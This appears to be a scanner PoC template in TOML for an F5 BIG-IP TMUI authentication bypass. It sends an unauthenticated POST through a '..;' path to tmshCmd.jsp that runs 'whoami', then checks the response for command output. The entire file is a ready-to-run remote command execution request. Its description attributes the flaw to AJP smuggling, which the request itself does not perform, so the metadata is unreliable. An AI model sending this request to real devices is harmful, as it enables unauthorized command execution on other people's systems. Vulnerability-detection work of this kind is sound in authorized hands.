[info]
id = "POC-AVE-2023-0002"
name = "F5 BIG-IP TMUI 认证绕过 RCE PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "auth-bypass", "ajp-smuggling"]
description = "F5 BIG-IP 配置实用程序存在认证绕过漏洞(CVE-2023-46747)，通过AJP协议走私绕过身份验证执行任意系统命令。此PoC通过访问tmshCmd.jsp执行whoami命令验证漏洞是否存在。"
vuln_id = ["CVE-2023-46747", "AVE-2023-0002"]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp"

headers.Content-Type = "application/x-www-form-urlencoded"

body.type = "raw"
body.content = "command=whoami"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["Command", "output", "root", "admin"]
expect = true
